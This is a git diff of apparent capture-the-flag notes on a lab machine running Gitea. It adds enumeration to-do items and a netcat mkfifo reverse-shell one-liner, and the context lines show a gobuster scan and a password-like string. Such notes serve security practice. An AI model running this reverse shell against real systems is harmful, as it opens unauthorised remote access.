@@ -8,7 +8,9 @@
 - [x] The `/console` directory.
 - [ ] Try to accomplish port forwarding somehow so that I would be able to open up the local web server much easier.
 - [ ] Research the Gitea version.
-
+- [ ] Check the users home directory
+- [ ] Check the directory of the internal web server.
+- [ ] The crons could get me somewhere
 <br/><br/>
 
 
@@ -25,6 +27,11 @@
 * There's a `swagger` data in a file called `swagger.v1.json` which means I have all the api endpoints and there data.
 * There's also a home page in the local web server that shows me that there's also a possibility that there exists a login and register page. But life would be so much easier if I can open the website on the browser that's why I'll play a bit with port forwarding.
 * A technology used called "Gitea" version 1.16.6
+
+### `.cache` directory is a deadend  
+### `.local/share/nano` has nothing  
+
+
 
 <br/><br/>
 
@@ -146,6 +153,7 @@ gobuster dir -u 10.10.11.164 -x 'txt,md,jpg,php,html' -w /usr/share/seclists/Dis
 * It's like using a reverse proxy for port forwarding.
 
 
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.11.164 1234 >/tmp/f
 
 `` Soulless_Developer#2022 ``  
 
